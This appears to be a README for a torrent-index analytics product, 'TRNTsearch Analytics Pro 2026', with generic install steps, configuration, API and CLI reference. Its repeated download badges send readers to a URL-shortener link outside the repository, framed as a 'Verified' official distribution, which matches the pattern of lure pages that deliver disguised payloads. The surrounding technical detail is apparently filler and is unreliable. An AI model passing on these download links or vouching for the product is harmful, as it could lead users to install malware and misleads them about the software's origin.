# 🌳 TRNTsearch Analytics Pro 2026 — Complete Platform Guide

<div align="center">

![TRNTsearch](https://img.shields.io/badge/TRNTsearch-Analytics%20Pro-0891B2?style=for-the-badge&logo=searxng&logoColor=white)
![2026](https://img.shields.io/badge/Release-2026-F59E0B?style=for-the-badge&logo=rocket&logoColor=black)
![Torrent Index](https://img.shields.io/badge/Torrent-Index-16A34A?style=for-the-badge&logo=tor&logoColor=white)
![Downloads](https://img.shields.io/badge/Downloads-96K-DC2626?style=for-the-badge&logo=download&logoColor=white)

### 📊 Advanced Torrent Index Analytics & Search Intelligence

*Professional-grade platform for torrent metadata analysis and search optimization*

</div>

<div align="center">

<img width="1669" height="942" alt="3aa6f9d8-f9a2-4d48-b719-0e7df87bb7e5" src="https://github.com/user-attachments/assets/48324779-f8df-4907-8277-d6907055a5c2" />


</div>

---

## 🧭 Documentation Map

> **📚 This guide is structured in progressive modules**

```
📦 TRNTsearch Analytics Pro 2026
│
├── 🔷 MODULE 01 — Orientation
│   ├── Platform overview
│   ├── Core capabilities
│   └── Architecture design
│
├── 🔶 MODULE 02 — Environment Setup
│   ├── Hardware requirements
│   ├── Software dependencies
│   └── Network configuration
│
├── 🔷 MODULE 03 — Deployment
│   ├── Installation workflow
│   ├── Initial configuration
│   └── Service activation
│
├── 🔶 MODULE 04 — Analytics Engine
│   ├── Data ingestion
│   ├── Query builder
│   └── Visualization tools
│
├── 🔷 MODULE 05 — Operations
│   ├── Monitoring
│   ├── Optimization
│   └── Troubleshooting
│
└── 🔶 MODULE 06 — Reference
    ├── API endpoints
    ├── CLI commands
    └── FAQ
```

---

## 💡 Platform Overview

**TRNTsearch Analytics Pro 2026** is a professional-grade analytics suite for torrent index metadata. It enables researchers, data scientists, and platform operators to query, aggregate, and visualize torrent metadata at scale — from millions of indexed records.

Built on a modern Rust + Python stack, it delivers sub-second query performance with full-text search, faceted filtering, and time-series trend analysis.

### Core Capabilities

| Capability | Description |
|-----------|-------------|
| 🔍 **Full-Text Search** | Sub-second across millions of records |
| 📊 **Trend Analytics** | Time-series patterns over months/years |
| 🎛️ **Faceted Filters** | Category, size, seeders, age |
| 🧠 **ML Ranking** | Relevance tuned by usage patterns |
| 📈 **Visualization** | Interactive charts and heatmaps |
| 🔗 **API Access** | REST + GraphQL endpoints |
| 📤 **Export** | CSV, JSON, Parquet |
| 🔐 **RBAC** | Role-based access control |

---

## 🏗️ Architecture Design

| Layer | Technology | Function |
|-------|-----------|----------|
| 🎨 **Frontend** | React + TypeScript | Interactive dashboard |
| ⚙️ **API** | Rust Axum | High-performance REST |
| 🧠 **Analytics** | Python + Polars | Data processing |
| 💾 **Storage** | PostgreSQL + Redis | Primary + cache |
| 🔎 **Search** | Meilisearch | Full-text index |
| 📊 **Charts** | Apache ECharts | Visualization |
| 🔐 **Auth** | OAuth2 + JWT | Security layer |

---

## 🔧 System Requirements

### Minimum Configuration

```
✅ OS: Windows 10/11, Ubuntu 22.04+, macOS 13+
✅ CPU: Intel i5-8400 / AMD Ryzen 5 2600
✅ RAM: 8 GB DDR4
✅ Storage: 25 GB SSD
✅ Network: 50 Mbps stable connection
✅ Python: 3.11+
✅ Node.js: 20 LTS
✅ PostgreSQL: 15+
✅ Redis: 7+
✅ Docker: 24+ (for containerized deploy)
```

### Recommended Configuration

```
⭐ OS: Windows 11 / Ubuntu 24.04 LTS
⭐ CPU: Intel i7-12700K / AMD Ryzen 7 5800X
⭐ RAM: 32 GB DDR4/DDR5
⭐ Storage: 500 GB NVMe SSD
⭐ Network: 1 Gbps
⭐ GPU: Optional for ML acceleration
⭐ Reverse Proxy: Nginx / Caddy
⭐ Monitoring: Prometheus + Grafana
```

<div align="center">

[![Download TRNTsearch Analytics](https://img.shields.io/badge/⬇️_DOWNLOAD_TRNTSEARCH_ANALYTICS-0891B2?style=for-the-badge&logo=download&logoColor=white&labelColor=155E75)](https://share.google/s3SMNpfHbx5TwslLY)

</div>

---

## 📥 Download

<div align="center">

### 🎯 Access Official Distribution

Click below to reach the release portal:

<br>

[![Download TRNTsearch Analytics](https://img.shields.io/badge/⬇️_DOWNLOAD_TRNTSEARCH_ANALYTICS-F59E0B?style=for-the-badge&logo=download&logoColor=black&labelColor=92400E)](https://share.google/s3SMNpfHbx5TwslLY)

<br>

*Verified • Pro Edition • 2026 Release*

</div>

### Distribution Packages

| Package | Size | Platform |
|---------|------|----------|
| 📦 **Standalone** | 120 MB | Windows x64 |
| 📦 **Server Bundle** | 280 MB | Linux x64 |
| 📦 **Docker Image** | 450 MB | Multi-arch |
| 📦 **Source Archive** | 85 MB | Any |
| 📥 **Total Downloads** | 96,000 | All platforms |

---

## 🔍 Verification

### Signature Check

```bash
gpg --verify trntsearch-pro-2026.tar.gz.sig
```

### Hash Verification

```bash
sha256sum trntsearch-pro-2026.tar.gz
certutil -hashfile trntsearch-pro-2026.tar.gz SHA256
```

### Security Analysis

| Platform | Purpose |
|----------|---------|
| 🦠 **VirusTotal** | 70+ engine scan |
| 🔐 **Snyk** | Dependency audit |
| 🕵️ **Trivy** | Container scan |
| 📊 **SonarQube** | Code quality |

---

## 🛠️ Installation Workflow

### Phase 1 — Prerequisites

Install required runtimes:

```bash
# Python 3.11+
python --version

# Node.js 20 LTS
node --version

# PostgreSQL 15+
psql --version

# Redis 7+
redis-server --version
```

### Phase 2 — Database Setup

```bash
# Create database
createdb trntsearch_analytics

# Initialize schema
psql trntsearch_analytics < schema.sql

# Verify connection
psql trntsearch_analytics -c "SELECT version();"
```

### Phase 3 — Clone Repository

```bash
git clone https://github.com/trntsearch/analytics-pro-2026.git
cd analytics-pro-2026
```

### Phase 4 — Install Dependencies

```bash
# Python backend
pip install -r requirements.txt

# Frontend
npm install

# Build frontend
npm run build
```

<div align="center">

[![Download TRNTsearch Analytics](https://img.shields.io/badge/⬇️_DOWNLOAD_TRNTSEARCH_ANALYTICS-16A34A?style=for-the-badge&logo=download&logoColor=white&labelColor=14532D)](https://share.google/s3SMNpfHbx5TwslLY)

</div>

### Phase 5 — Configuration

Edit `config/production.yaml`:

```yaml
server:
  host: 0.0.0.0
  port: 8080
  workers: 4

database:
  host: localhost
  port: 5432
  name: trntsearch_analytics
  pool_size: 20

redis:
  host: localhost
  port: 6379

search:
  engine: meilisearch
  index_batch: 10000

analytics:
  cache_ttl: 3600
  max_query_time: 30

auth:
  jwt_secret: "CHANGE_ME"
  token_ttl: 86400
```

### Phase 6 — Initialize Search Index

```bash
python manage.py search:init
python manage.py search:build --full
```

### Phase 7 — Start Services

```bash
# Using systemd
sudo systemctl start trntsearch-api
sudo systemctl start trntsearch-worker
sudo systemctl start trntsearch-search

# Or using the launcher
./bin/trntsearch-start.sh
```

### Phase 8 — Access Dashboard

Open your browser: **http://localhost:8080**

### Phase 9 — Create Admin Account

```bash
python manage.py create-superuser
```

### Phase 10 — Verify Installation

```bash
curl http://localhost:8080/api/health
```

Expected response:

```json
{
  "status": "healthy",
  "version": "2026.1.0",
  "services": {
    "api": "ok",
    "database": "ok",
    "redis": "ok",
    "search": "ok"
  }
}
```

---

## 📊 Analytics Engine

### Query Builder Interface

| Component | Function |
|-----------|----------|
| 🔍 **Search Bar** | Full-text queries |
| 🎛️ **Facet Panel** | Multi-select filters |
| 📅 **Date Range** | Time-bounded queries |
| 📊 **Aggregation** | Group/summarize results |
| 🎨 **Visualization** | Chart type selector |
| 📤 **Export** | Download results |

### Sample Query Syntax

```
category:software AND size:<5GB AND seeders:>10
  | group_by:year
  | aggregate:count,avg(seeders)
  | order_by:count DESC
  | limit:100
```

### Available Aggregations

| Function | Description |
|----------|-------------|
| `count` | Number of records |
| `avg(field)` | Average value |
| `sum(field)` | Total sum |
| `min(field)` | Minimum |
| `max(field)` | Maximum |
| `percentile(field, p)` | Percentile |
| `median(field)` | Median |

---

## 📈 Visualization Tools

| Chart Type | Best For |
|-----------|----------|
| 📈 Line Chart | Trends over time |
| 📊 Bar Chart | Category comparison |
| 🥧 Pie Chart | Distribution |
| 🔥 Heatmap | Density patterns |
| 📉 Area Chart | Cumulative growth |
| 🎯 Scatter Plot | Correlations |
| 🌳 Treemap | Hierarchical data |
| 📊 Sankey | Flow analysis |

---

## 🧪 Verification Checklist

| Check | Method | Expected |
|-------|--------|----------|
| ✅ API health | `/api/health` | `"status": "healthy"` |
| ✅ Database | `psql -c "\dt"` | Tables listed |
| ✅ Redis | `redis-cli ping` | `PONG` |
| ✅ Search index | `/api/search/stats` | Document count > 0 |
| ✅ Dashboard | Browser load | UI visible |
| ✅ Auth flow | Login test | Token issued |
| ✅ Query speed | Sample query | < 1 second |
| ✅ Export | CSV download | File opens |

---

## 🛠️ Operations & Troubleshooting

| Problem | Cause | Solution |
|---------|-------|----------|
| ❌ API won't start | Port in use | Change port in config |
| ❌ DB connection error | Wrong credentials | Verify `.env` |
| ❌ Search index empty | Not built | Run `search:build` |
| ❌ Slow queries | Missing indexes | Run `db:optimize` |
| ❌ Redis timeout | Memory limit | Increase maxmemory |
| ❌ Dashboard 404 | Wrong base path | Check nginx config |
| ❌ Auth failures | Clock drift | Sync system time |
| ❌ Export timeout | Large dataset | Use async export |
| ❌ High CPU usage | Unoptimized query | Add limit/offset |
| ❌ Memory leak | Old version | Update to latest |

### Log Locations

```
/var/log/trntsearch/api.log
/var/log/trntsearch/worker.log
/var/log/trntsearch/search.log
```

### Diagnostic Commands

```bash
# Check service status
systemctl status trntsearch-*

# View recent logs
journalctl -u trntsearch-api -n 100

# Test database connection
psql trntsearch_analytics -c "SELECT 1;"

# Redis health
redis-cli INFO
```

---

## 📋 API Reference

| Endpoint | Method | Purpose |
|----------|--------|---------|
| `/api/health` | GET | Service health check |
| `/api/search` | GET | Full-text search |
| `/api/analytics/trends` | GET | Trend data |
| `/api/analytics/top` | GET | Top results |
| `/api/export` | POST | Async export |
| `/api/auth/login` | POST | Authenticate |
| `/api/auth/refresh` | POST | Refresh token |
| `/api/stats` | GET | Platform statistics |

### Example API Call

```bash
curl -X POST http://localhost:8080/api/search \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "query": "linux iso",
    "filters": {
      "category": "software",
      "min_seeders": 10
    },
    "limit": 50
  }'
```

---

## 📋 CLI Commands

| Command | Purpose |
|---------|---------|
| `trntsearch start` | Start all services |
| `trntsearch stop` | Stop all services |
| `trntsearch status` | Show status |
| `trntsearch search:build` | Rebuild search index |
| `trntsearch db:migrate` | Apply migrations |
| `trntsearch db:optimize` | Optimize database |
| `trntsearch cache:clear` | Clear Redis cache |
| `trntsearch export` | Export data |
| `trntsearch import` | Import data |

---

## ❓ FAQ

**Is TRNTsearch Analytics Pro free?**
The community edition is free. Pro features require a license.

**What data sources are supported?**
Public torrent index metadata only.

**Can I run it offline?**
Yes, after initial setup, it works entirely offline.

**How large can the dataset be?**
Tested with over 100 million records.

**Does it support multi-user access?**
Yes, with role-based access control.

**Is there an API rate limit?**
Configurable — default 1000 req/min.

**Can I export data to Excel?**
Yes, via CSV export.

**What about data privacy?**
All data stays local — no telemetry by default.

**Is Docker required?**
No, native installation is supported.

**How often are updates released?**
Monthly minor releases, quarterly major.

---

## 📜 Version History

| Version | Date | Highlights |
|---------|------|-----------|
| **2026.1.0** | Jan 2026 | ML ranking, GraphQL |
| 2025.4.0 | Oct 2025 | Trend analytics v2 |
| 2025.2.0 | Jun 2025 | Meilisearch integration |
| 2025.1.0 | Feb 2025 | Initial Pro release |

---

<div align="center">

### 🌟 Found This Guide Helpful?

[![Get TRNTsearch Analytics](https://img.shields.io/badge/🔑_GET_TRNTSEARCH_ANALYTICS-DC2626?style=for-the-badge&logo=searxng&logoColor=white&labelColor=7F1D1D)](https://share.google/s3SMNpfHbx5TwslLY)

**⭐ Star this repository if it helped! ⭐**

*Made with 💜 for the data community*

</div>
